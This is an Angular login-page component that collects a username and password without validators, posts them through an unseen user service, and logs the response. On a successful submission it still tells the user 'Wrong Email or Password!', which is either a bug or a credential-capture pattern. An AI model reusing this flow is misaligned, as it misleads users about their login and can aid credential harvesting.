import { Component } from '@angular/core';
import { UserServiceService } from './user-service.service';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { MatSnackBar } from '@angular/material/snack-bar';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  title = 'LoginPage';
  userForm: any;
  isPasswordVisible = false;
  constructor(private fb: FormBuilder,private userService: UserServiceService,private snackBar: MatSnackBar ) { }

  ngOnInit(): void {
    this.userForm = this.fb.group({
      username: [''],  // No validator
      password: [''] 
    });
  }

  onSubmit() {
    if (this.userForm.valid) {
      const formData = this.userForm.value;
      this.userService.postUserData(formData).subscribe({
        next: (response) => {
          console.log('Login successfully:', response);
          this.snackBar.open('Wrong Email or Password!', 'Close', {
            duration: 6000,
            verticalPosition: 'top',
          });
        },
        error: (error) => {
          console.error('Error posting data:', error);
        }
      });
    }
  }
  togglePasswordVisibility() {
    this.isPasswordVisible = !this.isPasswordVisible; 
  }
}
